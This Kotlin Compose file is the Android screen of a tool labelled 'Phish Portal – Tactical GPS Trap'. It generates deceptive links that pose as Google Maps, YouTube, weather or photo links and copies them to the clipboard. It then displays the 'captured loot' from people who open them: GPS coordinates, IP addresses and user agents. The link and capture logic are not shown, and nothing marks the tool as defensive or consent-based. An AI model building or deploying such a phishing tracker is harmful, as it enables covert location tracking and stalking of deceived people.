package com.example.rabit.ui.automation

import androidx.compose.animation.*
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.example.rabit.ui.theme.*
import android.content.ClipboardManager
import android.content.Context
import android.widget.Toast

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun PhishPortalScreen(
    viewModel: PhishPortalViewModel,
    onBack: () -> Unit
) {
    val loot by viewModel.capturedLoot.collectAsState()
    val serverUrl by viewModel.serverUrl.collectAsState()
    val context = LocalContext.current

    Scaffold(
        containerColor = Obsidian,
        topBar = {
            CenterAlignedTopAppBar(
                title = {
                    Column(horizontalAlignment = Alignment.CenterHorizontally) {
                        Text(
                            "PHISH PORTAL",
                            style = MaterialTheme.typography.titleSmall.copy(
                                fontWeight = FontWeight.Black,
                                letterSpacing = (1.5).sp,
                                color = Platinum
                            )
                        )
                        Text("TACTICAL GPS TRAP", color = AccentBlue, fontSize = 9.sp, fontWeight = FontWeight.Bold)
                    }
                },
                navigationIcon = {
                    IconButton(onClick = onBack) {
                        Icon(Icons.AutoMirrored.Filled.ArrowBack, "Back", tint = Platinum)
                    }
                },
                actions = {
                    IconButton(onClick = { viewModel.clearLoot() }) {
                        Icon(Icons.Default.DeleteSweep, null, tint = Color.Red)
                    }
                },
                colors = TopAppBarDefaults.centerAlignedTopAppBarColors(containerColor = Color.Transparent)
            )
        }
    ) { padding ->
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(padding)
                .padding(horizontal = 20.dp)
        ) {
            // --- Link Generator Section ---
            Text("GENERATE TRACKING LINK", color = Silver, fontSize = 11.sp, fontWeight = FontWeight.Bold, modifier = Modifier.padding(bottom = 12.dp))
            
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                TemplateCard(
                    title = "Google Maps",
                    icon = Icons.Default.Map,
                    color = SuccessGreen,
                    modifier = Modifier.weight(1f),
                    onClick = { 
                        copyToClipboard(context, viewModel.generateLink("maps"))
                        Toast.makeText(context, "Maps Trap Copied!", Toast.LENGTH_SHORT).show()
                    }
                )
                TemplateCard(
                    title = "YouTube",
                    icon = Icons.Default.PlayCircle,
                    color = Color.Red,
                    modifier = Modifier.weight(1f),
                    onClick = { 
                        copyToClipboard(context, viewModel.generateLink("youtube"))
                        Toast.makeText(context, "YouTube Trap Copied!", Toast.LENGTH_SHORT).show()
                    }
                )
                TemplateCard(
                    title = "Weather",
                    icon = Icons.Default.Cloud,
                    color = AccentBlue,
                    modifier = Modifier.weight(1f),
                    onClick = { 
                        copyToClipboard(context, viewModel.generateLink("weather"))
                        Toast.makeText(context, "Weather Trap Copied!", Toast.LENGTH_SHORT).show()
                    }
                )
                TemplateCard(
                    title = "Photo",
                    icon = Icons.Default.Collections,
                    color = AccentGold,
                    modifier = Modifier.weight(1f),
                    onClick = { 
                        copyToClipboard(context, viewModel.generateLink("photo"))
                        Toast.makeText(context, "Photo Trap Copied!", Toast.LENGTH_SHORT).show()
                    }
                )
            }

            Spacer(modifier = Modifier.height(24.dp))

            // --- Captured Loot Section ---
            Row(
                modifier = Modifier.fillMaxWidth(),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                Text("CAPTURED TELEMETRY", color = Silver, fontSize = 11.sp, fontWeight = FontWeight.Bold)
                Surface(
                    color = if (loot.isNotEmpty()) SuccessGreen.copy(alpha = 0.1f) else Graphite,
                    shape = RoundedCornerShape(100.dp)
                ) {
                    Text(
                        "${loot.size} HITS", 
                        color = if (loot.isNotEmpty()) SuccessGreen else Silver, 
                        fontSize = 9.sp, 
                        fontWeight = FontWeight.Black,
                        modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp)
                    )
                }
            }

            Spacer(modifier = Modifier.height(12.dp))

            Surface(
                modifier = Modifier.weight(1f).fillMaxWidth(),
                color = Surface0.copy(alpha = 0.3f),
                shape = RoundedCornerShape(16.dp),
                border = androidx.compose.foundation.BorderStroke(1.dp, BorderColor.copy(alpha = 0.1f))
            ) {
                if (loot.isEmpty()) {
                    Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                        Column(horizontalAlignment = Alignment.CenterHorizontally) {
                            Icon(Icons.Default.Radar, null, tint = Silver.copy(alpha = 0.2f), modifier = Modifier.size(48.dp))
                            Spacer(modifier = Modifier.height(12.dp))
                            Text("AWAITING INCOMING UPLINK", color = Silver.copy(alpha = 0.3f), fontSize = 11.sp, fontWeight = FontWeight.Bold)
                        }
                    }
                } else {
                    LazyColumn(
                        modifier = Modifier.fillMaxSize(),
                        contentPadding = PaddingValues(12.dp),
                        verticalArrangement = Arrangement.spacedBy(12.dp)
                    ) {
                        items(loot) { entry ->
                            LootItem(entry)
                        }
                    }
                }
            }

            Spacer(modifier = Modifier.height(20.dp))
        }
    }
}

@Composable
private fun TemplateCard(title: String, icon: androidx.compose.ui.graphics.vector.ImageVector, color: Color, modifier: Modifier = Modifier, onClick: () -> Unit) {
    Surface(
        onClick = onClick,
        modifier = modifier.height(80.dp),
        color = Graphite.copy(alpha = 0.5f),
        shape = RoundedCornerShape(16.dp),
        border = androidx.compose.foundation.BorderStroke(1.dp, BorderColor.copy(alpha = 0.1f))
    ) {
        Column(
            modifier = Modifier.fillMaxSize(),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.Center
        ) {
            Icon(icon, null, tint = color, modifier = Modifier.size(24.dp))
            Spacer(modifier = Modifier.height(8.dp))
            Text(title, color = Platinum, fontSize = 10.sp, fontWeight = FontWeight.Bold)
        }
    }
}

@Composable
private fun LootItem(entry: com.example.rabit.data.network.RabitNetworkServer.LootLocation) {
    Surface(
        color = Surface0,
        shape = RoundedCornerShape(16.dp),
        border = androidx.compose.foundation.BorderStroke(1.dp, BorderColor.copy(alpha = 0.2f)),
        modifier = Modifier.fillMaxWidth()
    ) {
        Column(modifier = Modifier.padding(16.dp)) {
            Row(verticalAlignment = Alignment.CenterVertically) {
                Icon(Icons.Default.LocationOn, null, tint = Color.Red, modifier = Modifier.size(16.dp))
                Spacer(modifier = Modifier.width(8.dp))
                Text("COORDINATES CAPTURED", color = Platinum, fontSize = 12.sp, fontWeight = FontWeight.Black)
                Spacer(modifier = Modifier.weight(1f))
                Text(entry.template.uppercase(), color = AccentBlue, fontSize = 9.sp, fontWeight = FontWeight.Bold)
            }
            
            Spacer(modifier = Modifier.height(12.dp))
            
            Text(
                "LAT: ${entry.latitude}\nLON: ${entry.longitude}",
                color = SuccessGreen,
                fontFamily = FontFamily.Monospace,
                fontSize = 13.sp,
                lineHeight = 18.sp
            )
            
            Divider(modifier = Modifier.padding(vertical = 12.dp), color = BorderColor.copy(alpha = 0.1f))
            
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
                Column {
                    Text("IP ADDRESS", color = Silver.copy(alpha = 0.5f), fontSize = 8.sp, fontWeight = FontWeight.Bold)
                    Text(entry.ip, color = Platinum, fontSize = 10.sp)
                }
                Column(horizontalAlignment = Alignment.End) {
                    Text("USER AGENT", color = Silver.copy(alpha = 0.5f), fontSize = 8.sp, fontWeight = FontWeight.Bold)
                    Text(entry.userAgent.take(20) + "...", color = Platinum, fontSize = 10.sp)
                }
            }
        }
    }
}

private fun copyToClipboard(context: Context, text: String) {
    val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
    val clip = android.content.ClipData.newPlainText("Hackie Link", text)
    clipboard.setPrimaryClip(clip)
}
